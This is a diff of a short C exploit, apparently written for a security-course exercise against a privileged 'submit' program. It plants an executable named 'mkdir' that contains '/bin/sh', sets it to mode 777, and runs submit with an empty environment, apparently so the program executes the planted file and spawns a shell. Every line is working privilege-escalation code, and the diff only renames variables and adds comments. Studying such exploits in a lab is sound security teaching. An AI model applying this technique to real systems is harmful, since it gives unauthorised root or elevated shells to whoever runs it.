@@ -6,21 +6,19 @@
 
 int main(void) {
   char *args[4], *env[1];
-  FILE *f;
 
-  f = fopen("ls", "w");
-  fprintf(f, "/bin/sh\n");
-  fclose(f);
-
-  chmod("ls", S_IRWXU | S_IRWXG | S_IRWXO);
+  FILE *file;
+  file = fopen("mkdir", "w+"); // overwrite if already exists
+  fprintf(file, "/bin/sh\n");
+  fclose(file);
+  chmod("mkdir", S_IRWXU | S_IRWXG | S_IRWXO); // 777: rwx for everyone
 
   args[0] = "/usr/local/bin/submit";
-  args[1] = "f";
-  args[2] = "m";
+  args[1] = "file";
+  args[2] = "message";
   args[3] = NULL;
 
   env[0] = NULL;
 
   return execve("/usr/local/bin/submit", args, env);
 }
-
